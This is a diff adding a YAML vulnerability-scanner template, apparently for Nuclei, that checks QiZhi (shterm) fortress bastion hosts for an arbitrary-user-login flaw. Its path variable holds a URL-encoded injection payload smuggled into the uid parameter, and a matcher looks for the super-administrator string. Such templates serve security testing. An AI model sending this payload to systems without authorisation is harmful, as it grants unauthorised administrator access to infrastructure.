@@ -1,0 +1,28 @@
+id: shterm-arbitrary-user-login
+
+info:
+  name: shterm QiZhi fortress Arbitrary User Login
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Qizhi fortress machine any user login vulnerability that allows arbitrary user login.
+  reference:
+    - http://www.shterm.com/
+    - http://fofa.so
+  classification:
+    cvss-score: 9.3
+    cwe-id: "" # No specific CWE ID provided in the original POC
+
+variables:
+  path: "/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "超级管理员"
